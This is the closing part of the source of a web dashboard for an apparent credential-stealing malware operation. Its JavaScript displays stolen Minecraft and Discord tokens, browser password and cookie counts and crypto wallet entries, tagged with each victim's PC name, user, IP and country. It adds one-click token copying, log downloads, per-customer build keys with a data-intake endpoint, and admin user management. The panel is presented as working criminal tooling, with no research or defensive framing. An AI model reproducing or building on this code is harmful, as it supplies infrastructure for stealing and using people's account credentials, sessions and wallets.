                const token = data.access_token || '';
                const preview = token.substring(0, 50) + (token.length > 50 ? '...' : '');
                const tokenId = 'mc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Player: ${data.player || 'Unknown'}</div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }
            
            if (type === 'discord') {
                const token = data.token || '';
                const preview = token.substring(0, 40) + (token.length > 40 ? '...' : '');
                const tokenId = 'dc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">${data.username || 'Unknown'}${data.email ? ' • ' + data.email : ''}</div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }
            
            if (type === 'browser') {
                const pw = data.passwords?.length || 0;
                const ck = data.cookies?.length || 0;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Browser Data</div>
                    <div class="log-preview-content">
                        <span style="color: var(--warning)">${pw} passwords</span> • 
                        <span style="color: var(--success)">${ck} cookies</span>
                    </div>
                </div>`;
            }
            
            if (type === 'wallet') {
                return `
                <div class="log-preview">
                    <div class="log-preview-title">${data.wallet_name || 'Wallet'}</div>
                    <div class="log-preview-content">${data.wallet_type || 'Unknown type'}</div>
                </div>`;
            }
            
            return '';
        }

        function copyToken(tokenId, btn) {
            const text = window[tokenId] || '';
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(() => {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        async function showLogDetail(id) {
            const res = await api(`/api/logs/${id}`);
            if (!res.success) return;
            
            const log = res.log;
            const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
            
            // Store token globally for copy
            window.currentLogToken = null;
            
            let content = '';
            
            if (log.log_type === 'minecraft') {
                // MC: Show only token with big copy button
                const token = data.access_token || '';
                window.currentLogToken = token;
                document.getElementById('modalTitle').textContent = `MC Session: ${data.player || 'Unknown'}`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}<br>
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country})
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">ACCESS TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--mc-green); max-height: 200px; overflow: auto;">${token}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy MC Token
                    </button>
                `;
            } else if (log.log_type === 'discord') {
                // Discord: Show token prominently
                const token = data.token || '';
                window.currentLogToken = token;
                document.getElementById('modalTitle').textContent = `Discord: ${data.username || 'Unknown'}`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-envelope"></i> ${data.email || 'No email'}<br>
                        <i class="fas fa-phone"></i> ${data.phone || 'No phone'}<br>
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">DISCORD TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue);">${token}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Discord Token
                    </button>
                `;
            } else {
                // Other types: Show full JSON
                document.getElementById('modalTitle').textContent = `${log.log_type.toUpperCase()} Log`;
                content = `
                    <div style="margin-bottom: 16px;">
                        <strong>PC:</strong> ${log.pc_name}<br>
                        <strong>User:</strong> ${log.pc_user}<br>
                        <strong>IP:</strong> ${log.ip} (${log.country})<br>
                        <strong>Time:</strong> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; max-height: 400px; overflow: auto;">
                        <pre style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">${JSON.stringify(data, null, 2)}</pre>
                    </div>
                    <div style="margin-top: 16px;">
                        <button class="btn btn-primary" onclick="downloadLog(${log.id})">
                            <i class="fas fa-download"></i> Download
                        </button>
                    </div>
                `;
            }
            
            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('modal').classList.remove('active');
        }

        function downloadLog(id) {
            window.open(`/api/logs/${id}/download?token=${token}`, '_blank');
        }

        async function deleteLog(id) {
            if (!confirm('Delete this log?')) return;
            const res = await api(`/api/logs/${id}`, 'DELETE');
            if (res.success) {
                toast('Log deleted');
                loadDashboard();
                loadLogs();
            }
        }

        // Settings
        function loadSettings() {
            document.getElementById('buildKey').textContent = currentUser.build_key;
            document.getElementById('apiEndpoint').textContent = window.location.origin + '/api/data/' + currentUser.build_key;
        }

        async function changePassword() {
            const current = document.getElementById('currentPassword').value;
            const newPw = document.getElementById('newPassword').value;
            
            if (newPw.length < 6) return toast('Password must be at least 6 characters', 'error');
            
            const res = await api('/api/settings/password', 'POST', { current, new: newPw });
            if (res.success) {
                toast('Password changed');
                document.getElementById('currentPassword').value = '';
                document.getElementById('newPassword').value = '';
            } else {
                toast(res.error, 'error');
            }
        }

        // Admin
        async function loadUsers() {
            const res = await api('/api/admin/users');
            if (!res.success) return;
            
            document.getElementById('usersTable').innerHTML = res.users.map(u => `
                <tr>
                    <td>
                        <strong>${u.username}</strong>
                        ${u.is_admin ? '<span style="color: var(--accent); font-size: 11px;"> ADMIN</span>' : ''}
                    </td>
                    <td><code style="font-size: 11px;">${u.build_key}</code></td>
                    <td style="font-size: 12px; color: var(--text-secondary);">
                        MC: ${u.mc_sessions || 0} • DC: ${u.tokens || 0} • PW: ${u.passwords || 0}
                    </td>
                    <td>
                        <span style="color: ${u.is_active ? 'var(--success)' : 'var(--danger)'}">
                            ${u.is_active ? 'Active' : 'Disabled'}
                        </span>
                    </td>
                    <td>
                        ${!u.is_admin ? `
                            <button class="btn btn-secondary btn-sm" onclick="toggleUser(${u.id})">${u.is_active ? 'Disable' : 'Enable'}</button>
                            <button class="btn btn-secondary btn-sm" onclick="deleteUser(${u.id})">Delete</button>
                        ` : ''}
                    </td>
                </tr>
            `).join('');
        }

        async function loadAllLogs() {
            const res = await api('/api/admin/logs?limit=200');
            if (res.success) {
                renderLogs(res.logs, 'allLogsGrid');
            }
        }

        function showCreateUser() {
            document.getElementById('modalTitle').textContent = 'Create User';
            document.getElementById('modalBody').innerHTML = `
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" id="newUsername" placeholder="Username">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="newUserPassword" placeholder="Password">
                </div>
                <button class="btn btn-primary" onclick="createUser()">Create User</button>
            `;
            document.getElementById('modal').classList.add('active');
        }

        async function createUser() {
            const username = document.getElementById('newUsername').value;
            const password = document.getElementById('newUserPassword').value;
            
            const res = await api('/api/admin/users', 'POST', { username, password });
            if (res.success) {
                toast('User created');
                closeModal();
                loadUsers();
            } else {
                toast(res.error, 'error');
            }
        }

        async function toggleUser(id) {
            const res = await api(`/api/admin/users/${id}/toggle`, 'POST');
            if (res.success) {
                loadUsers();
            }
        }

        async function deleteUser(id) {
            if (!confirm('Delete this user and all their logs?')) return;
            const res = await api(`/api/admin/users/${id}`, 'DELETE');
            if (res.success) {
                toast('User deleted');
                loadUsers();
            }
        }

        // Init
        (async () => {
            if (await checkAuth()) {
                showApp();
            }
        })();

        // Close modal on outside click
        document.getElementById('modal').addEventListener('click', e => {
            if (e.target.id === 'modal') closeModal();
        });
    </script>
</body>
</html>
